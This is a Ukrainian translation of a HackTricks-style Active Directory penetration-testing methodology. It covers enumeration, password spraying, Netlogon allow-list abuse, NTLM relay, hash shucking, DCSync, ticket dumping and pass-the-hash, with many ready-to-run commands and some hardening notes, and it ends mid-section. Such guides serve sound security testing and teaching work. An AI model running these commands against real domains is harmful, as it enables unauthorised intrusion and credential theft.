# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Базовий огляд

**Active Directory** є фундаментальною технологією, яка дає змогу **мережевим адміністраторам** ефективно створювати й керувати **доменами**, **користувачами** та **об'єктами** в мережі. Вона розроблена з урахуванням масштабування, що дає змогу організовувати велику кількість користувачів у керовані **групи** та **підгрупи**, одночасно контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних рівнів: **доменів**, **дерев** і **лісів**. **Домен** охоплює набір об'єктів, таких як **користувачі** або **пристрої**, що використовують спільну базу даних. **Дерева** є групами таких доменів, об'єднаних спільною структурою, а **ліс** являє собою набір кількох дерев, поєднаних через **довірчі відносини**, формуючи найвищий рівень організаційної структури. На кожному з цих рівнів можна призначати конкретні права **доступу** та **комунікації**.

Ключові концепції **Active Directory**:

1. **Directory** – містить усю інформацію про об'єкти Active Directory.
2. **Object** – позначає сутності в каталозі, зокрема **користувачів**, **групи** або **спільні папки**.
3. **Domain** – слугує контейнером для об'єктів каталогу; у межах **лісу** можуть одночасно існувати кілька доменів, кожен із власним набором об'єктів.
4. **Tree** – група доменів, які мають спільний кореневий домен.
5. **Forest** – найвищий рівень організаційної структури в Active Directory, що складається з кількох дерев із **довірчими відносинами** між ними.

**Active Directory Domain Services (AD DS)** охоплює низку служб, критично важливих для централізованого керування мережею та комунікації в ній. До цих служб належать:

1. **Domain Services** – централізує зберігання даних і керує взаємодією між **користувачами** та **доменами**, включно з функціями **автентифікації** та **пошуку**.
2. **Certificate Services** – відповідає за створення, розповсюдження та керування захищеними **цифровими сертифікатами**.
3. **Lightweight Directory Services** – підтримує застосунки, що використовують каталоги, через **протокол LDAP**.
4. **Directory Federation Services** – надає можливості **single sign-on** для автентифікації користувачів у кількох вебзастосунках протягом одного сеансу.
5. **Rights Management** – допомагає захищати матеріали, захищені авторським правом, регулюючи їх несанкціоноване розповсюдження та використання.
6. **DNS Service** – має ключове значення для розпізнавання **доменних імен**.

Для детальнішого пояснення дивіться: [**TechTerms - визначення Active Directory**](https://techterms.com/definition/active_directory)

### **Автентифікація Kerberos**

Щоб навчитися **атакувати AD**, потрібно дуже добре **розуміти процес автентифікації Kerberos**.\
[**Перейдіть на цю сторінку, якщо ви ще не знаєте, як це працює.**](kerberos-authentication.md)

## Шпаргалка

На [https://wadcoms.github.io/](https://wadcoms.github.io) можна знайти багато інформації для швидкого перегляду команд, які можна використовувати для перерахування/експлуатації AD.

> [!WARNING]
> Комунікація Kerberos **потребує повного кваліфікованого імені (FQDN)** для виконання дій. Якщо спробувати отримати доступ до машини за IP-адресою, **буде використано NTLM, а не kerberos**.

## Розвідка Active Directory (без creds/сеансів)

Якщо ви маєте доступ до середовища AD, але не маєте жодних облікових даних/сеансів, можна:

- **Pentest мережі:**
- Просканувати мережу, знайти машини та відкриті порти й спробувати **експлуатувати вразливості** або **отримати облікові дані** з них (наприклад, [принтери можуть бути дуже цікавими цілями](ad-information-in-printers.md).
- Перерахування DNS може надати інформацію про ключові сервери в домені, зокрема вебсервери, принтери, шари, vpn, медіасервери тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Перегляньте загальну [**методологію Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md), щоб отримати більше інформації про те, як це робити.
- **Перевірити null- і Guest-доступ до smb-сервісів** (це не працюватиме в сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Детальніший посібник із перерахування SMB-сервера можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Перерахування Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Детальніший посібник із перерахування LDAP можна знайти тут (зверніть **особливу увагу на анонімний доступ**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Отруєння мережі**
- Збирати облікові дані, [**імітуючи сервіси за допомогою Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Отримувати доступ до хоста, [**зловживаючи relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Збирати облікові дані, **виставляючи** [**фальшиві UPnP-сервіси за допомогою evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягувати імена користувачів/імена з внутрішніх документів, соціальних мереж і сервісів (переважно вебсервісів) у доменних середовищах, а також із загальнодоступних джерел.
- Якщо ви знайдете повні імена працівників компанії, можна спробувати різні **правила формування імен користувачів AD (**[**прочитайте це**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Найпоширеніші правила: _NameSurname_, _Name.Surname_, _NamSur_ (по 3 літери кожного імені), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _випадкові літери та 3 випадкові цифри_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перерахування користувачів

- **Анонімне перерахування SMB/LDAP:** перегляньте сторінки про [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) і [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Перерахування за допомогою Kerbrute**: коли запитується **недійсне ім'я користувача**, сервер відповідає кодом **помилки Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дає змогу визначити недійсність імені користувача. Для **дійсних імен користувачів** сервер повертає або **TGT у відповіді AS-REP**, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, яка вказує, що користувач має пройти попередню автентифікацію.
- **Відсутність автентифікації проти MS-NRPC**: використання auth-level = 1 (без автентифікації) проти інтерфейсу MS-NRPC (Netlogon) на контролерах домену. Метод викликає функцію `DsrGetDcNameEx2` після прив'язки до інтерфейсу MS-NRPC, щоб перевірити існування користувача або комп'ютера без будь-яких облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип перерахування. Дослідження можна знайти [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Сервер OWA (Outlook Web Access)**

Якщо ви виявили один із таких серверів у мережі, ви також можете виконати **перерахування користувачів проти нього**. Наприклад, можна скористатися інструментом [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки імен користувачів у [**цьому github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  і в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Однак у вас уже мають бути **імена людей, які працюють у компанії**, отримані на етапі recon, який слід було виконати раніше. За іменем і прізвищем можна використати скрипт [**namemash.py**](https://gist.github.com/superkojiman/11076951), щоб згенерувати потенційно дійсні імена користувачів.

### Зловживання allow-list для вразливого каналу Netlogon (Onelogon)

Навіть після виправлення **Zerologon** на DC, облікові записи, явно додані до allow-list, усе ще можуть бути exposed до **legacy/vulnerable поведінки захищеного каналу Netlogon**. Ризикована конфігурація — це GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** або відповідне значення реєстру **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Це значення є **дескриптором безпеки SDDL** (див. [Security Descriptors](security-descriptors.md)). Будь-який обліковий запис або група, якій надано відповідний ACE у DACL, можуть бути цілями. Наприклад, `O:BAG:BAD:(A;;RC;;;WD)` фактично додає **Everyone** до allow-list.

Практичний workflow оператора:

1. **Визначте principals у allow-list**, перевіривши і **SYSVOL/GPO**, і **live registry DC**.
2. **Розв’яжіть SIDs**, знайдені в SDDL, до реальних AD users/computers і надайте пріоритет **обліковим записам машин DC**, **обліковим записам trust** та іншим привілейованим машинам.
3. Повторно намагайтеся виконати **MS-NRPC / Netlogon authentication** від імені облікового запису в allow-list.
4. Після успішної спроби використайте **Netlogon password-setting**, щоб скинути пароль цільового облікового запису (public PoC встановлює його як порожній рядок).<sup>[[9]](#references)[[10]](#references)</sup>

Короткі приклади triage / lab із public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Нотатки:

- **scanner** корисний, оскільки фактичний allow-list може знаходитися в **SYSVOL**, **registry** або в обох місцях.
- Сам exploit path важливий, оскільки після виявлення вразливого облікового запису він **не потребує привілеїв Domain Admin**.
- Компрометація **machine account Domain Controller** на кшталт `DC$` особливо небезпечна, оскільки скидання цього пароля може безпосередньо уможливити ширші шляхи до **AD takeover**.
- Можливість **brute-force** залежить від режиму: публічний artifact описує підхід meet-in-the-middle, **24-bit** brute force за наявності іншого computer account і повільніші варіанти **32-bit**.

Нотатки щодо Detection / hardening:

- Перевірте політику allow-list і видаліть усе, крім тимчасових, явно необхідних compatibility exceptions.
- Відстежуйте **System** events **5827/5828/5829/5830/5831** на DC, щоб виявляти вразливі Netlogon connections, які було відхилено, виявлено або явно дозволено політикою.
- Вважайте accounts у `VulnerableChannelAllowList` **high-risk**, доки legacy dependency не буде усунуто.

### Знання одного або кількох usernames

Отже, ви вже знаєте дійсний username, але не маєте passwords... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо user **не має** атрибута _DONT_REQ_PREAUTH_, можна **запросити AS_REP message** для цього user, яка міститиме дані, зашифровані похідним від пароля user.
- [**Password Spraying**](password-spraying.md): Спробуйте най **поширеніші passwords** для кожного з виявлених users — можливо, хтось використовує слабкий пароль (зважайте на password policy!).
- Зауважте, що також можна виконувати **spray OWA servers**, щоб спробувати отримати доступ до mail servers users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Можливо, вам вдасться **отримати** challenge **hashes**, виконуючи **poisoning** деяких протоколів **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося виконати enumeration active directory, ви матимете **більше emails і краще розумітимете network**. Можливо, вам вдасться примусово виконати NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack), щоб отримати доступ до AD env.

### NetExec workspace-driven recon & relay posture checks

- Використовуйте **`nxcdb` workspaces**, щоб зберігати стан AD recon окремо для кожного engagement: `workspace create <name>` створює окремі SQLite DB для кожного протоколу в `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap тощо). Перемикайте views за допомогою `proto smb|mssql|winrm` і переглядайте зібрані secrets за допомогою `creds`. Після завершення вручну видаліть sensitive data: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Швидке subnet discovery за допомогою **`netexec smb <cidr>`** показує **domain**, **OS build**, **SMB signing requirements** і **Null Auth**. Members із позначкою `(signing:False)` є **relay-prone**, тоді як DC зазвичай вимагають signing.
- Створюйте **hostnames у /etc/hosts** безпосередньо з output NetExec, щоб спростити targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Якщо **SMB relay до DC заблоковано** через signing, усе одно перевірте стан **LDAP**: `netexec ldap <dc>` показує `(signing:None)` / слабкий channel binding. DC із примусовим SMB signing, але вимкненим LDAP signing, залишається придатною ціллю для **relay-to-LDAP** зловживань, як-от **SPN-less RBCD**.

### Client-side printer credential leaks → масова перевірка доменних облікових даних

- Веб-інтерфейси принтерів іноді **вбудовують замасковані паролі адміністраторів у HTML**. Перегляд source/devtools може розкрити cleartext (наприклад, `<input value="<password>">`), що дає змогу отримати Basic-auth доступ до репозиторіїв сканування/друку.
- Отримані завдання друку можуть містити **plaintext onboarding-документи** з паролями окремих користувачів. Під час тестування зберігайте відповідність пар «користувач–пароль»:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або shares** за допомогою **null або guest user**, ви можете **розмістити файли** (наприклад, SCF-файл), які, якщо до них якимось чином звернуться, **ініціюють NTLM authentication проти вас**, щоб ви могли **викрасти** **NTLM challenge** для його crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** розглядає кожен NT hash, яким ви вже володієте, як candidate password для інших, повільніших форматів, матеріал ключа яких безпосередньо походить від NT hash. Замість brute-force довгих passphrase у Kerberos RC4 tickets, NetNTLM challenges або cached credentials, ви передаєте NT hashes у NT-candidate modes Hashcat і дозволяєте йому перевірити повторне використання password, не дізнаючись plaintext. Це особливо ефективно після domain compromise, коли ви можете зібрати тисячі поточних та історичних NT hashes.<sup>[[5]](#references)</sup>

Використовуйте shucking, коли:

- У вас є NT corpus із DCSync, SAM/SECURITY dumps або credential vaults, і потрібно перевірити повторне використання в інших domains/forests.
- Ви перехопили RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses або DCC/DCC2 blobs.
- Ви хочете швидко підтвердити повторне використання довгих, непридатних для crack passphrase та негайно виконати pivot через Pass-the-Hash.

Ця техніка **не працює** проти encryption types, ключі яких не є NT hash (наприклад, Kerberos etype 17/18 AES). Якщо domain примусово використовує лише AES, потрібно повернутися до звичайних password modes.

#### Створення NT hash corpus

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з history, щоб отримати максимально можливий набір NT hashes (і їхні попередні значення):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Історичні записи значно розширюють candidate pool, оскільки Microsoft може зберігати до 24 попередніх hashes для кожного account. Інші способи отримання NTDS secrets дивіться тут:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує локальні дані SAM/SECURITY і cached domain logons (DCC/DCC2). Видаліть дублікати та додайте ці hashes до того самого списку `nt_candidates.txt`.
- **Track metadata** – Зберігайте username/domain, з якого було отримано кожен hash (навіть якщо wordlist містить лише hex). Hashes, що збігаються, одразу показують, який principal повторно використовує password, щойно Hashcat виведе знайдений candidate.
- Віддавайте перевагу candidates з того самого forest або trusted forest; це максимізує ймовірність збігу під час shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- Вхідні дані NT-candidate **повинні залишатися raw 32-hex NT hashes**. Вимкніть rule engines (без `-r` і без hybrid modes), оскільки mangling пошкоджує матеріал candidate key.
- Ці modes не є inherently faster, але NTLM keyspace (~30,000 MH/s на M3 Max) приблизно у 100 разів швидший за Kerberos RC4 (~300 MH/s). Перевірка curated NT list значно дешевша, ніж дослідження всього password space у повільному форматі.
- Завжди запускайте **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки modes 31500/31600/35300/35400 були додані нещодавно.<sup>[[7]](#references)</sup>
- Наразі не існує NT mode для AS-REQ Pre-Auth, а AES etypes (19600/19700) потребують plaintext password, оскільки їхні ключі виводяться через PBKDF2 із UTF-16LE passwords, а не з raw NT hashes.

#### Приклад – Kerberoast RC4 (mode 35300)

1. Перехопіть RC4 TGS для target SPN за допомогою low-privileged user (деталі дивіться на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Виконайте shuck ticket за допомогою вашого NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat виводить RC4 key з кожного NT candidate та перевіряє `$krb5tgs$23$...` blob. Збіг підтверджує, що service account використовує один із наявних у вас NT hashes.

3. Негайно виконайте pivot через PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

За потреби plaintext можна відновити пізніше за допомогою `hashcat -m 1000 <matched_hash> wordlists/`.

#### Приклад – Cached credentials (mode 31600)

1. Dump cached logons із compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Скопіюйте DCC2 line для потрібного domain user у `dcc2_highpriv.txt` і виконайте shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Успішний match повертає NT hash, який уже відомий у вашому list, підтверджуючи, що cached user повторно використовує password. Використовуйте його безпосередньо для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або brute-force у fast NTLM mode, щоб відновити string.

Той самий workflow застосовується до NetNTLM challenge-responses (`-m 27000/27100`) і DCC (`-m 31500`). Після ідентифікації match можна запустити relay, SMB/WMI/WinRM PtH або повторно crack NT hash за допомогою masks/rules offline.



## Enumerating Active Directory WITH credentials/session

На цьому етапі ви повинні мати **скомпрометовані credentials або session дійсного domain account**. Якщо у вас є дійсні credentials або shell від імені domain user, **пам’ятайте, що наведені раніше options усе ще можна використовувати для компрометації інших users**.

Перед початком authenticated enumeration слід знати, що таке **Kerberos double hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Компрометація account — це **великий крок до компрометації всього domain**, оскільки ви зможете розпочати **Active Directory Enumeration:**

Щодо [**ASREPRoast**](asreproast.md), тепер можна знайти кожного потенційно вразливого user, а щодо [**Password Spraying**](password-spraying.md) — отримати **список усіх usernames** і спробувати password скомпрометованого account, порожні passwords та нові перспективні passwords.

- Ви можете використовувати [**CMD для виконання basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використовувати [**powershell для recon**](../basic-powershell-for-pentesters/index.html), що буде stealthier
- Також можна [**використовувати powerview**](../basic-powershell-for-pentesters/powerview.md), щоб отримати детальнішу інформацію
- Ще одним чудовим tool для recon в Active Directory є [**BloodHound**](bloodhound.md). Він **не дуже stealthy** (залежно від collection methods, які ви використовуєте), але **якщо вас це не турбує**, обов’язково спробуйте його. Знайдіть, де users можуть використовувати RDP, знайдіть path до інших groups тощо.
- **Інші automated AD enumeration tools:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), оскільки вони можуть містити цікаву інформацію.
- **Tool with GUI**, який можна використовувати для enumeration directory, — це **AdExplorer.exe** з **SysInternal** Suite.
- Також можна виконувати пошук у LDAP database за допомогою **ldapsearch**, щоб знаходити credentials у полях _userPassword_ та _unixUserPassword_ або навіть у _Description_. Див. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) щодо інших methods.
- Якщо ви використовуєте **Linux**, можна також виконувати enumeration domain за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Також можна спробувати automated tools:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Дуже легко отримати всі domain usernames із Windows (`net user /domain`, `Get-DomainUser` або `wmic useraccount get name,sid`). У Linux можна використовувати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Навіть якщо цей розділ Enumeration здається невеликим, це найважливіша його частина. Відкрийте links (головним чином links для cmd, powershell, powerview і BloodHound), навчіться виконувати enumeration domain і практикуйтеся, доки не почуватиметеся впевнено. Під час assessment це буде ключовим моментом для пошуку шляху до DA або для визначення, що нічого зробити не можна.

### Kerberoast

Kerberoasting передбачає отримання **TGS tickets**, які використовуються services, пов’язаними з user accounts, і offline crack їхнього encryption, який базується на user passwords.

Детальніше про це:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Отримавши credentials, можна перевірити, чи маєте ви доступ до будь-якої **machine**. Для цього можна використовувати **CrackMapExec**, щоб спробувати підключитися до кількох servers через різні protocols відповідно до результатів port scans.

### Local Privilege Escalation

Якщо ви скомпрометували credentials або session звичайного domain user і маєте **access** з цим user до **будь-якої machine у domain**, слід спробувати знайти спосіб **локально підвищити privileges та виконати looting credentials**. Це необхідно, оскільки лише з local administrator privileges ви зможете **dump hashes інших users** у пам’яті (LSASS) і локально (SAM).

У цій книзі є окрема сторінка про [**local privilege escalation у Windows**](../windows-local-privilege-escalation/index.html) та [**checklist**](../checklist-windows-privilege-escalation.md). Також не забудьте використовувати [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Дуже **малоймовірно**, що ви знайдете **tickets** у поточного user, які надають вам **permission для доступу** до неочікуваних resources, але це можна перевірити:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося провести enumeration Active Directory, у вас буде **більше email-адрес і краще розуміння мережі**. Можливо, ви зможете примусово виконати NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Пошук Creds у Computer Shares | SMB Shares

Тепер, коли у вас є базові credentials, слід перевірити, чи можете ви **знайти** якісь **цікаві файли, до яких надано спільний доступ усередині AD**. Це можна зробити вручну, але це дуже нудне повторюване завдання (особливо якщо ви знайдете сотні документів, які потрібно перевірити).

[**Перейдіть за цим посиланням, щоб дізнатися про інструменти, які можна використовувати.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **отримати доступ до інших ПК або shares**, ви можете **розмістити файли** (наприклад, SCF-файл), які в разі доступу до них **ініціюють NTLM authentication проти вас**, щоб ви могли **викрасти** **NTLM challenge** для його crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому authenticated user **скомпрометувати контролер домену**.


{{#ref}}
printnightmare.md
{{#endref}}

## Підвищення привілеїв в Active Directory WITH privileged credentials/session

**Для наведених нижче технік звичайного domain user недостатньо — потрібні спеціальні привілеї/credentials для виконання цих атак.**

### Витягування hash

Сподіваємося, вам вдалося **скомпрометувати обліковий запис local admin**, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), включно з relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [локальне підвищення привілеїв](../windows-local-privilege-escalation/index.html).\
Тепер настав час dump усіх hash з пам'яті та локальних джерел.\
[**Прочитайте цю сторінку про різні способи отримання hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Отримавши hash користувача**, ви можете використати його, щоб **видати себе за нього**.\
Потрібно використати **інструмент**, який **виконає** **NTLM authentication за допомогою** цього **hash**, **або** можна створити новий **sessionlogon** і **інжектувати** цей **hash** у **LSASS**, щоб під час будь-якої **NTLM authentication** використовувався саме **цей hash**. Саме це робить mimikatz.\
[**Прочитайте цю сторінку для отримання додаткової інформації.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака має на меті **використати NTLM hash користувача для запиту Kerberos tickets**, як альтернативу поширеному Pass The Hash через протокол NTLM. Тому це може бути особливо **корисним у мережах, де протокол NTLM вимкнено** і як authentication protocol **дозволено лише Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** зловмисники **викрадають authentication ticket користувача** замість його пароля або значень hash. Потім цей викрадений ticket використовується, щоб **видати себе за користувача**, отримуючи несанкціонований доступ до ресурсів і сервісів у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Повторне використання Credentials

Якщо у вас є **hash** або **пароль** **local administrator**, слід спробувати **локально увійти** до інших **ПК**, використовуючи його.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **noisy**, а **LAPS** може це **mitigate**.

### MSSQL Abuse & Trusted Links

Якщо користувач має привілеї **access MSSQL instances**, він може використати їх для **execute commands** на MSSQL host (якщо він працює від імені SA), **steal** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Також MSSQL instance може бути trusted (database link) іншим MSSQL instance. Якщо користувач має привілеї над trusted database, він зможе **use the trust relationship to execute queries also in the other instance**. Ці trust relationships можна ланцюжити, і зрештою користувач може знайти misconfigured database, де зможе execute commands.\
**Links між databases працюють навіть через forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse IT asset/deployment platforms

Сторонні inventory та deployment suites часто відкривають потужні шляхи до credentials і code execution. Дивіться:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте domain privileges на цьому computer, ви зможете dump TGTs з memory кожного user, який login-иться на computer.\
Отже, якщо **Domain Admin login-иться на computer**, ви зможете dump його TGT та impersonate його за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation можна навіть **automatically compromise a Print Server** (сподіваємося, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо user або computer дозволено для "Constrained Delegation", він зможе **impersonate any user to access some services in a computer**.\
Тоді, якщо ви **compromise the hash** цього user/computer, ви зможете **impersonate any user** (навіть domain admins) для доступу до певних services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Наявність привілею **WRITE** на Active Directory object віддаленого computer дає змогу отримати code execution з **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse Permissions/ACLs

Compromised user може мати **interesting privileges over some domain objects**, які дозволять вам пізніше **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
